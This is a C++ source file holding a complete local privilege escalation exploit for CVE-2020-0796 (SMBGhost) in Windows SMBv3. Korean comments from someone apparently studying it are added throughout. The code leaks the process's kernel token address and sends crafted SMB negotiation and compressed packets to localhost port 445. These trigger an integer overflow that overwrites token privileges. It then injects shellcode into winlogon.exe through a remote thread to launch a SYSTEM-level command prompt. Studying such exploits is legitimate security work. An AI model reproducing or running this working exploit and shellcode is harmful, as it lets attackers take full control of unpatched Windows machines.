// https://github.com/danigargu/CVE-2020-0796/blob/master/cve-2020-0796-local/exploit.cpp

/*
 * CVE-2020-0796 LPE
 * 
 * Daniel Garcia Gutierrez (@danigargu) - danigargu[at]gmail.com
 * Manuel Blanco Parajon (@dialluvioso) - dialluvioso[at]protonmail.com
 * Date: 03/29/2020
 *
 * 공격 코드 분석이 매우 쉬운 편입니다. 
 * 2일에 걸쳐서 분석을 마무리 할까 합니다.
 * 1일 분석: 코드 전체를 훑어 보았음. o (후킹 분석 완료).
 * 2일 분석: 세부 취약점 상세 이해 분석.
 *
 **/

#include <stdio.h>
#include <stdint.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <TlHelp32.h>
#include "ntos.h"

#pragma comment(lib, "ws2_32.lib")

// 핸들 주소 얻기 함수 (HANDLE).
ULONG64 get_handle_addr(HANDLE h) {
	ULONG len = 20;
	NTSTATUS status = (NTSTATUS)0xc0000004;
	PSYSTEM_HANDLE_INFORMATION_EX pHandleInfo = NULL;
	do {
		len *= 2;
		pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)GlobalAlloc(GMEM_ZEROINIT, len);
		status = NtQuerySystemInformation(SystemExtendedHandleInformation, pHandleInfo, len, &len);
	} while (status == (NTSTATUS)0xc0000004);

	if (status != (NTSTATUS)0x0) {
		printf("NtQuerySystemInformation() failed with error: %#x\n", status);
		return 1;
	}

	DWORD mypid = GetProcessId(GetCurrentProcess());
	ULONG64 ptrs[1000] = { 0 };
	for (int i = 0; i < pHandleInfo->NumberOfHandles; i++) {
		PVOID object = pHandleInfo->Handles[i].Object;
		ULONG_PTR handle = pHandleInfo->Handles[i].HandleValue;
		DWORD pid = (DWORD)pHandleInfo->Handles[i].UniqueProcessId;
		if (pid != mypid)
			continue;
		if (handle == (ULONG_PTR)h)
			return (ULONG64)object;
	}
	return -1;
}

// 프로세스 토큰 얻는 함수. 64비트 unsigned long 타입(ktoken).
ULONG64 get_process_token() {
	HANDLE token;
	HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
	if (proc == INVALID_HANDLE_VALUE)
		return 0;

	OpenProcessToken(proc, TOKEN_ADJUST_PRIVILEGES, &token);
	ULONG64 ktoken = get_handle_addr(token);

	return ktoken;
}

// 에러 종료 함수.
int error_exit(SOCKET sock, const char* msg) {
	int err;
	if (msg != NULL) {
		printf("%s failed with error: %d\n", msg, WSAGetLastError());
	}
	if ((err = closesocket(sock)) == SOCKET_ERROR) {
		printf("closesocket() failed with error: %d\n", WSAGetLastError());
	}
	WSACleanup();
	return EXIT_FAILURE;
}

// 네고(SMB 패킷) 전송.
int send_negotiation(SOCKET sock) {
	int err = 0;
	char response[8] = { 0 };

	const uint8_t buf[] = { // buf = SMB 네고시에이션.
		/* NetBIOS 래퍼 */
		0x00,                   /* 세션 */
		0x00, 0x00, 0xC4,       /* 전패 길이 */

		/* SMB Header */
		0xFE, 0x53, 0x4D, 0x42, /* 프로토콜 id */
		0x40, 0x00,             /* 구조체 크기 0x40(must be) */
		0x00, 0x00,             /* 크레딧 정도 */
		0x00, 0x00,             /* 채널 연속 */
		0x00, 0x00,             /* 채널 할당자 */
		0x00, 0x00,             /* 명령어 */
		0x00, 0x00,             /* 크레딧 요청 */
		0x00, 0x00, 0x00, 0x00, /* 플래그들 */
		0x00, 0x00, 0x00, 0x00, /* 체인 오프셋 */
		0x00, 0x00, 0x00, 0x00, /* 메세지 id */
		0x00, 0x00, 0x00, 0x00, 
		0x00, 0x00, 0x00, 0x00, /* 예약 바이트 */
		0x00, 0x00, 0x00, 0x00, /* 트리 id */
		0x00, 0x00, 0x00, 0x00, /* 세션 id */
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, /* 시그너처(식별자) */
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,

		/* SMB 네고시에이션 요청 */
		0x24, 0x00,             /* 구조 크기 */
		0x08, 0x00,             /* dialect 카운트(8) */
		0x00, 0x00,             /* 보안 모드(0) */
		0x00, 0x00,             /* 예약 바이트열 */
		0x7F, 0x00, 0x00, 0x00, /* 캠퍼빌리티(권한) */
		0x01, 0x02, 0xAB, 0xCD, /* guid */
		0x01, 0x02, 0xAB, 0xCD,
		0x01, 0x02, 0xAB, 0xCD,
		0x01, 0x02, 0xAB, 0xCD,
		0x78, 0x00,             /* 네고 턴텍스트(컨)*/
		0x00, 0x00,             /* 추가 패딩(0) */
		0x02, 0x00,             /* 네고 컨텍스트 카운트(2)*/
		0x00, 0x00,             /* 예약 바이트열(2바이트)*/
		0x02, 0x02,             /* dialects, SMB 2.0.2 */
		0x10, 0x02,             /* SMB 2.1 */
		0x22, 0x02,             /* SMB 2.2.2 */
		0x24, 0x02,             /* SMB 2.2.3 */
		0x00, 0x03,             /* SMB 3.0 */
		0x02, 0x03,             /* SMB 3.0.2 */
		0x10, 0x03,             /* SMB 3.0.1 */
		0x11, 0x03,             /* SMB 3.1.1 */
		0x00, 0x00, 0x00, 0x00, /* 패딩 4바이트열. */

		/* 접속전 컨텍스트(타입=1) */
		0x01, 0x00,             /* 타입 (1) */
		0x26, 0x00,             /* 길이(0x26) */
		0x00, 0x00, 0x00, 0x00, /* 예약 4바이트열 */
		0x01, 0x00,             /* 해시 알고리즘 카운트(1) */
		0x20, 0x00,             /* 샐트 길이(32) */
		0x01, 0x00,             /* 해시 알고리즘(SHA512) */
		0x00, 0x00, 0x00, 0x00, /* 샐트 0x00 4바이트열. */
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00,             /* 패딩 */

		/* 압축된 컨텍스트(타입=3) */
		0x03, 0x00,             /* 타입 */
		0x0E, 0x00,             /* 길이 */
		0x00, 0x00, 0x00, 0x00, /* 예약 바이트열(4바이트) */
		0x02, 0x00,             /* 압축된 알고리즘 카운트 */
		0x00, 0x00,             /* 패딩 2바이트열 */
		0x01, 0x00, 0x00, 0x00, /* 플래그즈 */
		0x02, 0x00,             /* LZ77 */
		0x03, 0x00,             /* LZ77+허프만(Huffman) */
		0x00, 0x00, 0x00, 0x00, /* 패딩값(0x00 4바이트열). */
		0x00, 0x00, 0x00, 0x00
	};
	
	// 소켓 전송.
	if ((err = send(sock, (const char *)buf, sizeof(buf), 0)) != SOCKET_ERROR) {
		recv(sock, response, sizeof(response), 0); 
	}

	return err;
}

// 압축 전송. (SMB 헤더에 decompressed size 원본을 0xFFFFFFFF로 설정해서 숫자 오버플로우 트리거!
int send_compressed(SOCKET sock, unsigned char* buffer, ULONG len) {
	int err = 0;
	char response[8] = { 0 };

	const uint8_t buf[] = {
		/* NetBIOS Wrapper */
		0x00,
		0x00, 0x00, 0x33,

		/* SMB Header */
		0xFC, 0x53, 0x4D, 0x42, /* protocol id */
		0xFF, 0xFF, 0xFF, 0xFF, /* original decompressed size, trigger arithmetic overflow */
		0x02, 0x00,             /* compression algorithm, LZ77 */
		0x00, 0x00,             /* flags */
		0x10, 0x00, 0x00, 0x00, /* offset */
	};

	uint8_t* packet = (uint8_t*) malloc(sizeof(buf) + 0x10 + len);
	if (packet == NULL) {
		printf("Couldn't allocate memory with malloc()\n");
		return error_exit(sock, NULL);
	}

	memcpy(packet, buf, sizeof(buf));
	*(uint64_t*)(packet + sizeof(buf)) = 0x1FF2FFFFBC;
	*(uint64_t*)(packet + sizeof(buf) + 0x8) = 0x1FF2FFFFBC;
	memcpy(packet + sizeof(buf) + 0x10, buffer, len);

	if ((err = send(sock, (const char*)packet, sizeof(buf) + 0x10 + len, 0)) != SOCKET_ERROR) {
		recv(sock, response, sizeof(response), 0);
	}

	free(packet);
	return err;
}

// 인젝션(쉘코드 주입) 함수.
void inject(void) {
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	uint8_t shellcode[] = {
		 0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x6D, 0x64, 0x00, 0x54,
		 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76,
		 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17,
		 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17,
		 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F,
		 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99,
		 0xff, 0xc2, // inc edx (1 = SW_SHOW)
		 0xFF, 0xD7, 0x48, 0x83, 0xC4,
		 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3, 0x00
	};

	// CreateToolhelp32SNAPSHOT()으로 프로세스 스냅샷을 찍음.(프로세스 메모리 스냅샷임.) snapshot 핸들로 다룸.
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	int pid = -1;
	if (Process32First(snapshot, &entry) == TRUE) {
		while (Process32Next(snapshot, &entry) == TRUE) {
			if (lstrcmpiA(entry.szExeFile, "winlogon.exe") == 0) { // winlogon.exe 프로세스를 찾아서 
				pid = entry.th32ProcessID; //entry.th32ProcessID(프로세스 식별자)를 pid로 받고 코드 브레이크.
				break;
			}
		}
	}
	// 스냡샷 닫음.
	CloseHandle(snapshot);

	if (pid < 0) {
		printf("Could not find process\n");
		return;
	}
	printf("Injecting shellcode in winlogon...\n");

	// HANDLE hProc = winlogon.exe 프로세스를 엶.
	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProc == NULL) {
		printf("Could not open process\n");
		return;
	}

	// 가상 메모리를 0x1000만큼 hProc 가상 프로세스 상에 할당.
	LPVOID lpMem = VirtualAllocEx(hProc, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (lpMem == NULL) {
		printf("Remote allocation failed\n");
		return;
	}		

	// shellcode(쉘코드 값)을 해당 할당된 메모리에 씀.
	if (!WriteProcessMemory(hProc, lpMem, shellcode, sizeof(shellcode), 0)) {
		printf("Remote write failed\n");
		return;
	}
	
	// CreateRemoteThread() 함수로 쓰레드 시작 루틴으로 설정해서 후킹(인젝팅).
	if (!CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)lpMem, 0, 0, 0)) {
		printf("CreateRemoteThread failed\n");
		return;
	}

	// 후킹 성공!
	printf("Success! ;)\n");
}

// 메인 함수: 엔트리 포인터.
int main(int argc, char* argv[]) {
	WORD wVersionRequested = MAKEWORD(2, 2);
	WSADATA wsaData = { 0 };
	SOCKET sock = INVALID_SOCKET;
	uint64_t ktoken = 0;

	int err = 0;

	printf("-= CVE-2020-0796 LPE =-\n");
	printf("by @danigargu and @dialluvioso_\n\n");

	// WSAStartup 소켓 시작.
	if ((err = WSAStartup(wVersionRequested, &wsaData)) != 0) {
		printf("WSAStartup() failed with error: %d\n", err);
		return EXIT_FAILURE;
	}

	// 소켓 버전 2.2 체크.
	if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2) {
		printf("Couldn't find a usable version of Winsock.dll\n");
		WSACleanup();
		return EXIT_FAILURE;
	}

	// TCP 소켓 생성.
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET) {
		printf("socket() failed with error: %d\n", WSAGetLastError());
		WSACleanup();
		return EXIT_FAILURE;
	}

	// 로컬 호스트(127.0.0.1)의 445(SMB) 포트로 클라이언트 소켓 구조 설치.
	sockaddr_in client;
	client.sin_family = AF_INET;
	client.sin_port = htons(445);
	InetPton(AF_INET, "127.0.0.1", &client.sin_addr);

	// 연결.
	if (connect(sock, (sockaddr*)& client, sizeof(client)) == SOCKET_ERROR) {
		return error_exit(sock, "connect()");
	}

	printf("Successfully connected socket descriptor: %d\n", (int)sock);
	printf("Sending SMB negotiation request...\n");

	// SMB 네고.
	if (send_negotiation(sock) == SOCKET_ERROR) {
		printf("Couldn't finish SMB negotiation\n");
		return error_exit(sock, "send()");
	}

	printf("Finished SMB negotiation\n");
	// 버퍼 크기 = 0x1110.
	ULONG buffer_size = 0x1110;
	UCHAR *buffer = (UCHAR *)malloc(buffer_size);
	if (buffer == NULL) {
		printf("Couldn't allocate memory with malloc()\n");
		return error_exit(sock, NULL);
	}

	// ktoken = get_process_token() 함수로 커널 토큰 얻음.
	ktoken = get_process_token();
	if (ktoken == -1) {
		printf("Couldn't leak ktoken of current process...\n");
		return EXIT_FAILURE;
	}

	printf("Found kernel token at %#llx\n", ktoken);

	// 0x1110 메모리 중 0x1108 메모리를 'A'로 채움.
	// 0x1108 = ktoken + 0x40 (쓰길 원하는 위치 주소)를 설정
	memset(buffer, 'A', 0x1108);
	*(uint64_t*)(buffer + 0x1108) = ktoken + 0x40; /* where we want to write */

	ULONG CompressBufferWorkSpaceSize = 0;
	ULONG CompressFragmentWorkSpaceSize = 0;
	err = RtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_XPRESS, 
		&CompressBufferWorkSpaceSize, &CompressFragmentWorkSpaceSize);

	if (err != STATUS_SUCCESS) {
		printf("RtlGetCompressionWorkSpaceSize() failed with error: %d\n", err);
		return error_exit(sock, NULL);
	}

	ULONG FinalCompressedSize;
	UCHAR compressed_buffer[64];
	LPVOID lpWorkSpace = malloc(CompressBufferWorkSpaceSize);
	if (lpWorkSpace == NULL) {
		printf("Couldn't allocate memory with malloc()\n");
		return error_exit(sock, NULL);
	}

	err = RtlCompressBuffer(COMPRESSION_FORMAT_XPRESS, buffer, buffer_size,
		compressed_buffer, sizeof(compressed_buffer), 4096, &FinalCompressedSize, lpWorkSpace);

	if (err != STATUS_SUCCESS) {
		printf("RtlCompressBuffer() failed with error: %#x\n", err);
		free(lpWorkSpace);
		return error_exit(sock, NULL);
	}
	
	printf("Sending compressed buffer...\n");

	// 압축 전송으로 취약점이 트리거 되도록 compressed_buffer (숫자 오버플로우 취약점 트리거 구조)를 통해 SMB 데이터 전송.
	if (send_compressed(sock, compressed_buffer, FinalCompressedSize) == SOCKET_ERROR) {
		return error_exit(sock, "send()");
	}

	printf("SEP_TOKEN_PRIVILEGES changed\n");
	// SEP_TOKEN_PRIVILEGES가 변경되었고, 쉘코드를 인젝션해서 토큰으로 쉘코드 실행.
	inject();

	// 소켓 정리 아웃.
	WSACleanup();
	return EXIT_SUCCESS;
}